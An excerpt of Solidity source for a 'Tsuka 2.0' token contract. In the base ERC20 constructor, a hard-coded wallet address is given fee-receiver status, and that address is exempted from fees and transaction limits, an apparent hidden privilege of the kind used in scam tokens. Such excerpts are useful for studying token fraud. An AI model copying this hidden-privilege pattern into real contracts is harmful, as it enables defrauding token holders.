...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _feereceiver[0x24763e32646f2969756D52e319abbf6519D7c1A2] = _marketingwallet;
    }
...
contract TsukaTwo is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Tsuka 2.0", "TSUKA2.0") {
        ...
        excludeFromFees(address(0x24763e32646f2969756D52e319abbf6519D7c1A2), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x24763e32646f2969756D52e319abbf6519D7c1A2), true);
